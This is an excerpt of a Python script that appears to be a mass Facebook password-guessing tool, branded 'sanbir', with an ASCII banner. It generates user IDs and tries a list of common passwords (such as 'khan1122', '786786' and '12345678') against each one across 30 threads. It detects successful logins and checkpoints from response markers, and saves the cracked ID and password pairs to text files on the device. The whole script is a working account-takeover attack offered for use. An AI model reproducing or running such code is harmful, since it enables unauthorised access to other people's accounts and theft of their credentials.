...
\ `--.  __ _ _ __ | |__  _ _ __  \033[1;34m𝐏 \033[1;37m
  `--. \/ _` | '_ \| '_ \| | '__|\033[1;31m 𝐑\033[1;37m
 /\__/ / (_| | | | | |_) | | |   \033[1;35m𝐎 \033[1;37m
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as sanbir:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786','12345678','bangladesh',]
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [sanbir-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [sanbir-OK] %s | %s'%(ids,pas))
                                open('/sdcard/sanbir-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [sanbir-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Sanbir-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [sanbir-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Sanbir-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Sanbir-ok.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Sanbir-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Sanbir-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Sanbir-Ok] '+uid+' | '+pas+'\033[1;97m')
